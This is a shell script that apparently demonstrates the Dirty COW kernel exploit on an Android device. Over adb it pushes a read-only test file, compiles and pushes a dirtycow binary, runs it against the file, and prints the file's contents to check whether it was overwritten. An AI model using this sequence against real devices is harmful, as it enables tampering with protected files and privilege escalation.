#!/bin/sh
echo "Create and push test file......"

rm foo
echo test >> foo
adb push foo /data/local/tmp/foo
adb shell chmod 0404 /data/local/tmp/foo
adb shell ls -l /data/local/tmp/foo
echo "content:"
adb shell cat /data/local/tmp/foo
echo
echo "Create and push bynary"
arm-linux-gcc-4.4.3/bin/arm-linux-gcc dirtycow.c -pthread -static -o dirtycow
adb push dirtycow /data/local/tmp/dirtycow
adb shell ls -l /data/local/tmp/dirtycow
echo
echo "Start......"
adb shell /data/local/tmp/dirtycow /data/local/tmp/foo 1234
echo
echo "Result foo file:"
adb shell ls -l /data/local/tmp/foo
echo "content:"
adb shell cat /data/local/tmp/foo
echo
